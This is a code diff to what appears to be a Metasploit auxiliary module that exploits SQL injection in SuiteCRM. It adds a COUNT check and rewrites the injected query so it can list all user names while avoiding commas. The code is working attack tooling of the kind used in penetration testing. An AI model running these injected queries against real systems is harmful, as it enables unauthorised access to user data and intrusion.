@@ -45,7 +45,7 @@ class MetasploitModule < Msf::Auxiliary
       )
     )
     register_options [
-      OptInt.new('COUNT', [false, 'Number of users to enumerate', 3]),
+      OptInt.new('COUNT', [false, 'Number of users to enumerate (0 for all)', 3]),
       OptString.new('USERNAME', [true, 'Username of user', '']),
       OptString.new('PASSWORD', [true, 'Password for user', '']),
     ]
@@ -166,8 +166,18 @@ class MetasploitModule < Msf::Auxiliary
 
   # @return an array of usernames
   def get_user_names(sqli)
+    count = datastore['COUNT']
+    count = 0 if count.nil?
+    unless count.is_a?(Integer) && count >= 0
+      fail_with(Failure::BadConfig, 'COUNT must be zero or greater (0 for all users)')
+    end
+
     print_status 'Fetching Users, please wait...'
-    users = sqli.run_sql('select group_concat(DISTINCT user_name) from users')
+    # Limit before aggregation while keeping SQL comma-free for this endpoint.
+    query = 'select group_concat(user_name order by user_name) from (select distinct user_name from users order by user_name'
+    query << " limit #{count}" if count.positive?
+    query << ') suitecrm_users'
+    users = sqli.run_sql(query)
     users.split(',')
   end
 
